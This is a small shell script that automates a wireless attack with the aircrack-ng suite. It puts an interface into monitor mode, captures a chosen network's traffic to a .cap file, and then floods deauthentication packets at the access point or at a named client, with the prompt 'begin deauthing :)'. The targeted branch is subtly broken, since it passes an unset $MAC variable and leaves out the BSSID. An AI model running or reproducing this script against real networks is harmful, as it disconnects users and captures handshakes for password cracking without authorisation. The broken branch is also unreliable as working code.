#!/bin/sh

start_win(){
	gnome-terminal -x "$@"
	}

echo "Aircrack Automation Script (0.0.1). Designed by Carlos Saucedo."

sudo ifconfig
echo "Which interface will you be using?"
read interface

read -p "Do you want me to change the interface to monitor mode? (y/n)" yn
case $yn in
[n]* ) echo "Skipping mode change.";;
[y]* ) sudo ifconfig $interface down
	sudo iwconfig $interface mode monitor
	sudo ifconfig $interface up ;;
* ) echo "Invalid input";;
esac

read  -r -p "Press ENTER to run airodump-ng on $interface" key

start_win sudo airodump-ng $interface


read  -r -p "Press ENTER to continue" key

echo "What BSSID would you like to focus on?"
read bssid

echo "What channel would you like to focus on?"
read channel

echo "What path would you like to write .cap to?"
read path

start_win sudo airodump-ng --bssid $bssid -c $channel --write $path $interface

read  -r -p "Press ENTER to continue" key

read -p "Would you like to deauth a specific MAC?" deauth
case $deauth in
[n]* ) echo "How many packets?"
	read packets
	read  -r -p "Press ENTER to begin deauthing :)" key
	start_win sudo aireplay-ng --deauth $packets -a $bssid $interface ;;
[y]* ) echo "What MAC Address would you like to deauth?"
	read macaddr
	echo "How many packets?"
	read packets
	read  -r -p "Press ENTER to begin deauthing :)" key
	start_win sudo aireplay-ng --deauth $packets -c $MAC $interface;;
* ) echo "Invalid input" ;exit ;;
esac

read  -r -p "Finished! Press ENTER to exit." key
